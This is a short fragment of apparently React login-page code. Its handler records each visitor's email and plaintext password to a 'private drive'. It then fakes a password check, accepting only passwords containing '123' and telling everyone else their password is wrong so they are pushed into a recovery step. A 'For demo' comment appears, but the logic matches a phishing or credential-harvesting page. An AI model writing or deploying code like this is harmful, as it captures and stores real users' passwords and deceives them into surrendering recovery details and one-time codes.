        setIsLoading(true);

        // Simulating credential check
        setTimeout(() => {
            setIsLoading(false);
            // Record login attempt to private drive
            recordToPrivateDrive({ type: "LOGIN", email, password, timestamp: new Date().toISOString() });

            // For demo: Any password with '123' is "correct", others fail to show Forgot Password
            if (password.includes("123")) {
                generateAndSendOtp(email);
            } else {
                toast.error("Incorrect password. Redirecting to recovery...");
                setTimeout(() => setStep(1.3), 1000);
            }
        }, 1200);
    };

    const handleGoogleBtnClick = () => {
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            setStep(1.2);
        }, 800);
